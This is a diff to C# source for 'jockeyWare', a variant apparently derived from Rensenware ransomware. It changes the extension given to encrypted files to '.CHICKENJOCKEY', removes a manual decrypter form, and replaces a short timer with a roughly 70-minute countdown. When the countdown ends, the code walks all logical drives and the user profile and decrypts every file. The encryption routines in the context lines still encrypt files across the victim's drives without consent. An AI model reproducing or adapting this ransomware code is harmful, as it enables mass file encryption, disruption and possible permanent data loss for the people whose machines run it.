@@ -3,10 +3,6 @@ using System.Collections.Generic;
 using System.IO;
 using System.Security.Cryptography;
 using System.Timers;
-using System.ComponentModel;
-using System.Drawing;
-using System.Threading;
-using System.Windows.Forms;
 
 namespace jockeyWare
 {
@@ -69,7 +65,7 @@ namespace jockeyWare
 									if (fileName.EndsWith(fileExt))
 									{   // Encrypt the file
 										Program.Crypt(fileName, false);
-										Program.encryptedFiles.Add(fileName + ".RENSENWARE");
+										Program.encryptedFiles.Add(fileName + ".CHICKENJOCKEY");
 									}
 								}
 							}
@@ -90,7 +86,7 @@ namespace jockeyWare
 								if (fileName.EndsWith(fileExt))
 								{   // Encrypt the file
 									Program.Crypt(fileName, false);
-									Program.encryptedFiles.Add(fileName + ".RENSENWARE");
+									Program.encryptedFiles.Add(fileName + ".CHICKENJOCKEY");
 								}
 							}
 						}
@@ -133,52 +129,81 @@ namespace jockeyWare
 			timmyr.Elapsed += onTimerElapse;
 			timmyr.Start();
 			Console.ReadLine();
-			
-			/*
-			if (File.Exists(Program.KeyFilePath) && File.Exists(Program.IVFilePath))
-			{
-                                Program.randomKey = File.ReadAllBytes(Program.KeyFilePath);
-                                if (Program.randomKey.Length == 32)
-				{
-                                        Program.randomIV = File.ReadAllBytes(Program.IVFilePath);
-					if (Program.randomIV.Length == 16)
-					{
-                                                Application.Run(new frmManualDecrypter());
-						return;
-                                       }
-                               }
-                        }*/
 		}
 
-	        public static int countdown = 15;
+                public static UInt16 countdown = 4168;
                 public static Timer timmyr;
 
                 static void onTimerElapse(Object source, System.Timers.ElapsedEventArgs e)
                 {
-		        countdown--;
-		        if(countdown < 1)
-		        {
-		                /*
-                                if (File.Exists(Program.KeyFilePath) && File.Exists(Program.IVFilePath))
+                        countdown--;
+                        if(countdown < 1)
+                        {
+                                Console.WriteLine("CHICKEN JOCKEY!!!!!!");
+                                timmyr.Stop();
+                                Console.WriteLine("Your files are now being decrypted. Please wait...");
+			
+                                // This is the same code as the encryptor from Main() except i changed it up a bit to decrypt instead.
+                                string[] logicalDrives = Environment.GetLogicalDrives();
+                                string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
+                                foreach (string zeDrive in logicalDrives)
                                 {
-                                        Program.randomKey = File.ReadAllBytes(Program.KeyFilePath);
-                                        if (Program.randomKey.Length == 32)
-                                        {
-                                                Program.randomIV = File.ReadAllBytes(Program.IVFilePath);
-                                                if (Program.randomIV.Length == 16)
-                                                {
-                                                        Application.Run(new frmManualDecrypter());
-                                                        return;
-                                                }
-                                        }
-                                }*/
-			        Console.WriteLine("CHICKEN JOCKEY!!!!!!");
-			        timmyr.Stop();
-			        Environment.Exit(0);
+				        if (folderPath.Contains(zeDrive))
+				        {
+					        foreach (string path in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\.."))
+					        {
+        						try
+	        					{
+		        					foreach (string fileName in Directory.GetFiles(path, "*.*", SearchOption.AllDirectories))
+			        				{
+				        				Program.Crypt(fileName, true);
+					        		}
+						        }
+        						catch
+	        					{
+		        				}
+			        		}
+				        }
+        				else
+	        			{
+		        			foreach (string fileName in Directory.GetFiles(zeDrive))
+			        		{
+				        		try
+					        	{
+						                Program.Crypt(fileName, true);
+        						}
+	        					catch
+		        				{
+			        			}
+				        	}
+
+        					// Search folders
+	        				foreach (string zeFolders in Directory.GetDirectories(zeDrive))
+		        			{
+			        			try
+				        		{
+					        	        foreach (string fileName in Directory.GetFiles(zeFolders, "*.*", SearchOption.AllDirectories))
+						        	{
+							                Program.Crypt(fileName, true);
+        							}
+	        					}
+		        				catch
+			        			{
+				        		}
+					        }
+        				}
+                                }
+
+                                Console.WriteLine("Your files have been successfully decrypted!\nPress any key to exit.");
+                                Console.ReadKey();
+                                Environment.Exit(0);
                         }
-		        else
-		        {
-		                Console.WriteLine("\nTime left: " + countdown.ToString() + " seconds");
+                        else
+                        {
+                                TimeSpan timelapsed = TimeSpan.FromSeconds(4168 - countdown);
+                                TimeSpan timeleft = TimeSpan.FromSeconds(countdown);
+	                        Console.WriteLine("\nTime elapsed: " + timelapsed.ToString(@"hh\:mm\:ss"));
+	                        Console.WriteLine("Time left: " + timeleft.ToString(@"hh\:mm\:ss"));
 		        }
 		}
 
@@ -217,118 +242,6 @@ namespace jockeyWare
 					File.Delete(path);
 				}
 			}
-		}
-	}
-
-	public partial class frmManualDecrypter
-	{
-		private byte[] Key;
-		private byte[] IV;
-
-		public frmManualDecrypter()
-		{
-			this.InitializeComponent();
-		}
-
-		private void ButtonKey_Click(object sender, EventArgs e)
-		{
-			OpenFileDialog openFileDialog = new OpenFileDialog
-			{
-				Title  = "Open Key File",
-				Filter = "Key/IV Binary File (*.bin)|*.bin"
-			};
-
-			if (openFileDialog.ShowDialog() == DialogResult.OK)
-			{
-				this.KeyPath.Text = openFileDialog.FileName;
-				this.Key = File.ReadAllBytes(openFileDialog.FileName);
-				if (this.Key.Length != 32)
-				{
-					MessageBox.Show("Invalid Key File!");
-				}
-			}
-			else
-			{
-				this.Key = null;
-			}
-			this.StartDecrypt.Enabled = (this.Key == null || this.IV == null);
-		}
-
-		private void StartDecrypt_Click(object sender, EventArgs e)
-		{
-			OpenFileDialog openFileDialog = new OpenFileDialog
-			{
-				Title  = "Open Multiple Encrypted Files",
-				Filter = "All (*.*)|*.*",
-				Multiselect = true
-			};
-
-			if (openFileDialog.ShowDialog() == DialogResult.OK)
-			{
-				string[] files = openFileDialog.FileNames;
-				this.ProgressDecrypt.Value = 0;
-				this.ProgressDecrypt.Maximum = files.Length;
-				new Thread(delegate()
-				{
-					foreach (string fileName in files)
-					{
-						try
-						{
-							this.DecryptStatus.Invoke(new MethodInvoker(delegate()
-							{
-								this.DecryptStatus.Text = Path.GetFileName(fileName);
-							}));
-
-							Program.Crypt(fileName, true); // Decrypt the file
-							
-							this.ProgressDecrypt.Invoke(new MethodInvoker(delegate()
-							{
-								ProgressBar progressDecrypt = this.ProgressDecrypt;
-								int value = progressDecrypt.Value;
-								progressDecrypt.Value = value + 1;
-							}));
-
-							this.DecryptedList.Invoke(new MethodInvoker(delegate()
-							{
-								this.DecryptedList.Items.Add(fileName);
-								this.DecryptedList.SelectedIndex = this.DecryptedList.Items.Count - 1;
-							}));
-						}
-						catch
-						{
-							this.DecryptedList.Invoke(new MethodInvoker(delegate()
-							{
-								this.DecryptedList.Items.Add("FAIL : " + fileName);
-								this.DecryptedList.SelectedIndex = this.DecryptedList.Items.Count - 1;
-							}));
-						}
-					}
-				}).Start();
-			}
-		}
-
-		private void ButtonIV_Click(object sender, EventArgs e)
-		{
-			OpenFileDialog openFileDialog = new OpenFileDialog
-			{
-				Title  = "Open IV File",
-				Filter = "Key/IV Binary File (*.bin)|*.bin"
-			};
-
-			if (openFileDialog.ShowDialog() == DialogResult.OK)
-			{
-				this.IVPath.Text = openFileDialog.FileName;
-				this.Key = File.ReadAllBytes(openFileDialog.FileName);
-				if (this.Key.Length != 16)
-				{
-					MessageBox.Show("Invalid IV File!");
-				}
-			}
-			else
-			{
-				this.IV = null;
-			}
-			this.StartDecrypt.Enabled = (this.Key == null || this.IV == null);
 		}
 	}
 }
